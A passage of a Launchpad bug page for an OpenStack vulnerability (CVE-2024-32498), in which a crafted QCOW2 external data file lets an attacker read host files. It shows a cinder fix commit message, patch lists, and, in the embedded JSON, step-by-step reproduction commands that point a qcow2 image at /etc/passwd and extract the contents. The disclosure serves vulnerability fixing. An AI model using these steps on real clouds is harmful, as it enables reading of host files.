    the format_inspector module from Glance.  This performs basic
    analysis on the image data file so we can detect problematic
    images before we call qemu-img info to get all the image
    attributes.  It is expected that this code will eventually be
    added to oslo so it can be consumed by Glance, Cinder, and
    Nova.
    
    Because cinder itself may create qcow2 format images with a
    backing file in nfs-based backends, the glance format_inspector
    has been modified to optionally allow such files.  Since we are
    monkeying with the format_inspector code, we also copy over
    its unit tests to prevent regressions and to add tests for the
    changed code.
    
    Includes an additional fix to prevent an issue where a user
    could mount a raw volume and write a qcow2 header with a larger
    virtual size on it. On reattaching the volume it would have the
    new larger virtual size avaialable without actually changing
    the size value in cinder.  While we cannot prevent this we can
    prevent the user from using this volume again, which makes this
    exploit pointless.
    
    unmaintained/yoga only: The tests
    cinder.tests.unit.volume.drivers.test_quobyte.QuobyteDriverTestCase.
    * test_copy_volume_from_snapshot_not_cached_overlay
    * test_copy_volume_from_snapshot
    * test_copy_volume_from_snapshot_not_cached
    failed as convert_image mock was not called, remove this mock
    from yoga and on older branches.
    
    With older qemu installed one of the qemu-img
    create commands fails, let's skip it from unmaintained/yoga and
    below that in test_qcow2_safety_checks.
    
    Co-authored-by: Dan Smith &lt;dansmith@redhat.com&gt;
    Co-authored-by: Felix Huettner &lt;felix.huettner@mail.schwarz&gt;
    
    Conflicts:
      cinder/image/image_utils.py
    
    NOTE(elod.illes): conflict is due to mypy patch was added in xena only:
    Ib32e58125be3a2b6d05488807c83d48e920cf57d
    
    Change-Id: I65857288b797cde573e7443ac6e7e6f57fedde01
    Closes-bug: #2059809
    (cherry picked from commit 4aa6590a483901de64e0d162fff11f3d2d7f9977)
    (cherry picked from commit d6a186945e03649343af55b46ed8dfe0dd326e40)
    (cherry picked from commit db98dc207060da234c32a563c13cac1edbd62952)
    (cherry picked from commit 9e667b02b2c20b4ada18c1a472be152956284d45)
    (cherry picked from commit 5f5e86e3542866227b7339713148b5169d069f21)
    (cherry picked from commit 0c3c65376f1aa46b35bedb4b59eac0bf8cc5979e)
    (cherry picked from commit 312d98d74490414902f3379b91b63dfa65f9b622)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-unmaintained-wallaby
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/455" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-12-06T19:12:07.924419+00:00" title="2024-12-06 19:12:07 UTC">on 2024-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/455">
                <strong>Fix proposed to cinder (unmaintained/victoria)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/455"> #455</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/<wbr />victoria<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/cinder/+/937284">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/cinder/<wbr />+/937284</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/victoria
Review: https://review.opendev.org/c/openstack/cinder/+/937284</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/nova/+bug/2059809/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
        
          <div class="informational message comments-hidden-message">
            Displaying first 40
            and last 40
            comments.
            
              <a class="show-comments-link" href="/nova/+bug/2059809?comments=all">
                View all 455
                comments</a> or <a href="/nova/+bug/2059809?comments=all">add a comment</a>.
            
          </div>
            
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/nova/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    
    
    
    
    
    
    
  </ul>
  <ul id="lock-status-actions">
    
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/nova/+bug/2059809/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/nova/+bug/2059809/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/nova/+bug/2059809/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5761287/+files/nova.patch" class="sprite haspatch-icon">nova.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5761287">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5761288/+files/glance.patch" class="sprite haspatch-icon">glance.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5761288">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5761289/+files/cinder.patch" class="sprite haspatch-icon">cinder.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5761289">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792231/+files/cinder-master-additional-qemu-safety.patch" class="sprite haspatch-icon">cinder-master-additional-qemu-safety.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792231">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792254/+files/cinder-master-additional-size-check.patch" class="sprite haspatch-icon">cinder-master-additional-size-check.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792254">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792392/+files/cinder-additionals-fixed.patch" class="sprite haspatch-icon">cinder-additionals-fixed.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792392">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792632/+files/CVE-2024-32498_4_repair_unit_tests.patch" class="sprite haspatch-icon">CVE-2024-32498_4_repair_unit_tests.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792632">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792738/+files/cinder-2059809-additional-tests-master.patch" class="sprite haspatch-icon">cinder-2059809-additional-tests-master.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792738">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792870/+files/nova-master-2059809.patch" class="sprite haspatch-icon">nova-master-2059809.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792870">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792871/+files/nova-2024.1-2059809.patch" class="sprite haspatch-icon">Nova unified patch for 2024.1</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792871">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792872/+files/nova-2023.2-2059809.patch" class="sprite haspatch-icon">Nova unified patch for 2023.2</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792872">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792873/+files/nova-2023.1-2059809.patch" class="sprite haspatch-icon">Nova unified patch for 2023.1</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792873">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792906/+files/glance-master-2058089.patch" class="sprite haspatch-icon">Glance unified patch for master</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5792906">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5793094/+files/glance-2024.1-2059809.patch" class="sprite haspatch-icon">Glance unified patch for 2024.1</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5793094">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5793095/+files/glance-2023.2-2059809.patch" class="sprite haspatch-icon">Glance unified patch for 2023.2</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5793095">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5793096/+files/glance-2023.1-2059809.patch" class="sprite haspatch-icon">Glance unified patch for 2023.1</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5793096">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5793098/+files/glance-train-minimal.patch" class="sprite haspatch-icon">Train-ish example backport for glance</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5793098">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5793883/+files/late-nova-fix.patch" class="sprite haspatch-icon">late-nova-fix.patch</a>
        <a class="sprite edit action-icon" title="Change patch details" href="/nova/+bug/2059809/+attachment/5793883">Edit</a>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/nova/+bug/2059809/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  <div class="portlet" id="portlet-attachments">
    <h2>Bug attachments</h2>
    <ul>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5761999/+files/qmp.sh" class="sprite download-icon">qmp.sh</a>
        <a class="sprite edit action-icon" title="Change attachment details" href="/nova/+bug/2059809/+attachment/5761999">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792163/+files/add-missing-stuff.tar.gz" class="sprite download-icon">add-missing-stuff.tar.gz</a>
        <a class="sprite edit action-icon" title="Change attachment details" href="/nova/+bug/2059809/+attachment/5792163">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792633/+files/cinder-2059809-unified-master-v2.txt" class="sprite download-icon">cinder-2059809-unified-master-v2.txt</a>
        <a class="sprite edit action-icon" title="Change attachment details" href="/nova/+bug/2059809/+attachment/5792633">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792634/+files/cinder-2059809-unified-stable-2024.1-v2.txt" class="sprite download-icon">cinder-2059809-unified-stable-2024.1-v2.txt</a>
        <a class="sprite edit action-icon" title="Change attachment details" href="/nova/+bug/2059809/+attachment/5792634">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792637/+files/cinder-2059809-unified-stable-2023.2-v2.txt" class="sprite download-icon">cinder-2059809-unified-stable-2023.2-v2.txt</a>
        <a class="sprite edit action-icon" title="Change attachment details" href="/nova/+bug/2059809/+attachment/5792637">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792638/+files/cinder-2059809-unified-stable-2023.1-v2.txt" class="sprite download-icon">cinder-2059809-unified-stable-2023.1-v2.txt</a>
        <a class="sprite edit action-icon" title="Change attachment details" href="/nova/+bug/2059809/+attachment/5792638">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792639/+files/cinder-2059809-unified-unmaintained-zed-v2.txt" class="sprite download-icon">cinder-2059809-unified-unmaintained-zed-v2.txt</a>
        <a class="sprite edit action-icon" title="Change attachment details" href="/nova/+bug/2059809/+attachment/5792639">Edit</a>
      </li>
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5792737/+files/CVE-2024-32498-glance-victoria.tar.gz" class="sprite download-icon">CVE-2024-32498-glance-victoria.tar.gz</a>
        <a class="sprite edit action-icon" title="Change attachment details" href="/nova/+bug/2059809/+attachment/5792737">Edit</a>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/nova/+bug/2059809/+addcomment">Add attachment</a>
      </li>
    </ul>
  </div>


      <div class="portlet" id="portlet-watches">
  <h2>Remote bug watches</h2>
  <ul>
    <li>
      <span class="sprite bug-remote"></span>
      <a class="link-external" href="https://bugzilla.redhat.com/show_bug.cgi?id=2278875">redhat-bugs #2278875</a>
      
        <br />[<span>NEW</span>]
        <a class="sprite edit action-icon" title="Change watch details" href="/bugs/2059809/+watch/160851">Edit</a>
    </li>
  </ul>
  <p>Bug watches keep track of this bug in other bug trackers.</p>
</div>

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-footer-logo.svg" alt="Launchpad" width="65" height="18" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://ubuntu.social/@launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        6394e03
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"related_features": {}, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/2059809", "web_link": "https://bugs.launchpad.net/bugs/2059809", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 2059809, "private": false, "information_type": "Public Security", "name": null, "title": "[OSSA-2024-001] Arbitrary file access through QCOW2 external data file (CVE-2024-32498)", "description": "OpenStack has security vulnerability in Nova or Glance, that allows an authenticated attacker to read arbitrary files.\nQCOW2 has two mechanisms to read from another file. The backing file issue was reported and fixed with OSSA-2015-014, but the external data file was not discovered.\n\nSteps to Reproduce:\n\n- Create a disk image: `qemu-img create -f qcow2 -o data_file=abcdefghigh,data_file_raw=on disk.qcow2 1G` with `abcdefghigh` a placeholder of the same length as the file to read. `qemu-img` will zero it.\n- Replace the filename in the disk image: `sed -i \"s#abcdefghigh#/etc/passwd#\" disk.qcow2`.\n- Upload/register the disk image: `openstack image create --disk-format qcow2 --container-format bare --file \"disk.qcow2\" --private \"my-image\"`.\n- Create a new instance: `openstack server create --flavor \"nano\" --image \"my-image\" \"my-instance\"`.\n\nWith the non-bootable instance there might be two ways to continue:\n\nOption 1:\n- Derive a new image: `openstack server image create --name \"my-leak\" \"my-instance\"`\n- Download the image: `openstack image save --file \"leak.qcow2\" \"my-leak\"`\n- The file content starts at guest cluster 0\n\nOption 2: (this is untested because I reproduced it only in a production system)\n- Reboot the instance in rescue mode: `openstack server rescue --image \"cirros-0.6.2-x86_64-disk\" \"my-instance\"`.\n- Go to the Dashboard, open the console of the instance and login to the instance.\n- Extract content from `/dev/sdb` with `cat /dev/sdb | fold -w 1024 | head -n 32`, `xxd -l 1024 -c 32 /dev/sdb` or similar methods.\n- It might be possible to write to the host file. If the disk image is mounted with `qemu-nbd`, writes go through to the external data file.", "owner_link": "https://bugs.launchpad.net/api/devel/~mkaesberger", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/bug_tasks", "duplicate_of_link": null, "date_created": "2024-03-29T19:31:33.550685+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/subscriptions", "date_last_updated": "2024-12-06T19:12:09.439553+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 376, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/cves", "vulnerabilities_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/vulnerabilities", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/attachments", "security_related": true, "latest_patch_uploaded": "2024-07-01T16:18:00.172930+00:00", "tags": ["in-unmaintained-wallaby", "in-unmaintained-xena", "in-unmaintained-yoga", "in-unmaintained-zed", "verification-ussuri-needed"], "date_last_message": "2024-12-06T19:12:07.924419+00:00", "number_of_duplicates": 0, "message_count": 456, "users_affected_count": 5, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/users_unaffected", "users_affected_count_with_dupes": 5, "other_users_affected_count_with_dupes": 5, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/messages", "lock_status": "Unlocked", "lock_reason": null, "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/2059809/linked_merge_proposals", "http_etag": "\"dcc283bf11db790dc6f27222748eada88fba077f-34b92b901839f553917275ba54cbd7e2f513de4e\""}, "subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/2059809", "self_link": "https://bugs.launchpad.net/api/devel/bugs/2059809"}, "total_comments_and_activity": 717, "initial_comment_batch_offset": 41, "first visible_recent_comment": 415, "information_type_data": {"PUBLIC": {"value": "PUBLIC", "description": "Everyone can see this information.\n", "name": "Public", "order": 0, "is_private": false, "description_css_class": "choice-description"}, "PUBLICSECURITY": {"value": "PUBLICSECURITY", "description": "Everyone can see this security related information.\n", "name": "Public Security", "order": 1, "is_private": false, "description_css_class": "choice-description"}, "PRIVATESECURITY": {"value": "PRIVATESECURITY", "description": "Only the security group can see this information.\n ", "name": "Private Security", "order": 2, "is_private": true, "description_css_class": "choice-description"}, "USERDATA": {"value": "USERDATA", "description": "Only shared with users permitted to see private user information.\n", "name": "Private", "order": 3, "is_private": true, "description_css_class": "choice-description"}}, "bug_is_private": false, "context": {"self_link": "https://bugs.launchpad.net/api/devel/nova/+bug/2059809", "web_link": "https://bugs.launchpad.net/nova/+bug/2059809", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/2059809", "milestone_link": null, "status": "Fix Released", "status_explanation": null, "importance": "Critical", "importance_explanation": null, "assignee_link": "https://bugs.launchpad.net/api/devel/~sylvain-bauza", "bug_target_display_name": "OpenStack Compute (nova)", "bug_target_name": "nova", "bug_watch_link": null, "date_assigned": "2024-06-26T09:02:14.833520+00:00", "date_created": "2024-03-29T19:31:33.550685+00:00", "date_confirmed": "2024-04-03T12:11:13.073876+00:00", "date_incomplete": null, "date_in_progress": "2024-04-03T12:11:13.073876+00:00", "date_closed": "2024-07-03T16:24:42.715004+00:00", "date_left_new": "2024-04-03T12:11:13.073876+00:00", "date_triaged": "2024-04-03T12:11:13.073876+00:00", "date_fix_committed": "2024-07-03T16:24:42.715004+00:00", "date_fix_released": "2024-07-03T16:24:42.715004+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~mkaesberger", "target_link": "https://bugs.launchpad.net/api/devel/nova", "title": "Bug #2059809 in OpenStack Compute (nova): \"[OSSA-2024-001] Arbitrary file access through QCOW2 external data file (CVE-2024-32498)\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/nova/+bug/2059809/related_tasks", "is_complete": true, "http_etag": "\"7ab072bcc9d7de803188fa2de1cf1f0ea0181c0f-5417f2faf5bbb8d52a4d5f915714c82dd117878f\""}};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 54 queries/external actions issued in 1.00 seconds

    Features: {'profiling.enabled': None, 'hard_timeout': '9000', 'app.mainsite_only.canonical_url': None, 'js.yui_version': None, 'app.maintenance_message': None, 'bugs.affected_count_includes_dupes.disabled': None, 'baselayout.careers_link.disabled': None, 'visible_render_time': None}

    r6394e03

    -->

</html>

